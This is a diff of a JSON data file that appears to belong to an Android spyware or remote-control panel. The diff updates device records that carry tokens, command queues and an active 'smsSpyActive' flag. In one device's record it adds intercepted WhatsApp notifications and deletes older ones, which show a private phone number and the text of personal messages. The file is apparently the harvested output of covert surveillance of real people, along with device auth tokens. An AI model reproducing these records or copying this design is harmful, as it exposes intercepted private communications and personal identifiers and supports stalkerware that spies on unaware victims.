@@ -68,7 +68,7 @@
     "deviceName": "HP-AGUSGANTENG123-3E9A",
     "ownerUsername": "zaa",
     "token": "20fdcadc903f75b92eda3edefa92e509",
-    "lastSeen": 1777373422338,
+    "lastSeen": 1777373425423,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T07:37:12.639Z",
@@ -1403,7 +1403,7 @@
     "deviceName": "HP-PEGASUS-B240",
     "ownerUsername": "Kanzun",
     "token": "5d33b8ecb200f311ed19db054f831b4d",
-    "lastSeen": 1777373420957,
+    "lastSeen": 1777373423953,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T11:02:22.793Z",
@@ -1419,6 +1419,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "GB ALL GAME V¹ | REGZ STORE",
+        "content": "‎2 pesan baru",
+        "time": "28/04 17:50",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777373426390
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "GB ALL GAME V¹ | REGZ STORE",
+        "content": "‎2 pesan baru",
+        "time": "28/04 17:50",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777373424384
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "GB ALL GAME V¹ | REGZ STORE: ~ MALZ STORE",
+        "content": "📷 ‎4 foto",
+        "time": "28/04 17:50",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777373424324
+      },
       {
         "appName": "WhatsApp",
         "sender": "GB ALL GAME V¹ | REGZ STORE: ~ MALZ STORE",
@@ -5394,30 +5418,6 @@
         "time": "27/04 20:53",
         "pkg": "com.whatsapp",
         "receivedAt": 1777298013711
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 838-7699-8241",
-        "content": "💟 Stiker",
-        "time": "27/04 20:53",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777298013645
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 838-7699-8241",
-        "content": "Kalo free ya Alhamdulillah",
-        "time": "27/04 20:51",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777297893904
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 838-7699-8241",
-        "content": "Kalo free ya Alhamdulillah",
-        "time": "27/04 20:51",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777297893824
       }
     ],
     "galleryPhotos": [],
